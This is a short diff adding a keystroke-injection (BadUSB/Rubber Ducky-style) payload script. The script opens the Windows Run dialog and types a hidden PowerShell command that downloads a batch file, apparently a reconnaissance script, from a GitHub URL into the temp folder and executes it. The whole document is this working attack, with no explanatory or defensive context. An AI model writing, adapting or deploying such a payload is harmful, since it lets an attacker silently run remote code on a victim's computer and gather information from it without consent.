@@ -1,0 +1,6 @@
+DELAY 2500
+GUI r
+DELAY 200
+STRING powershell /NoProfile /NoLogo /command "iwr https://raw.githubusercontent.com/Naggelus/information_gathering_pnb/master/recon1.bat -OutFile $env:TEMP\recon1.bat; start $env:TEMP\recon1.bat"
+DELAY 200
+ENTER
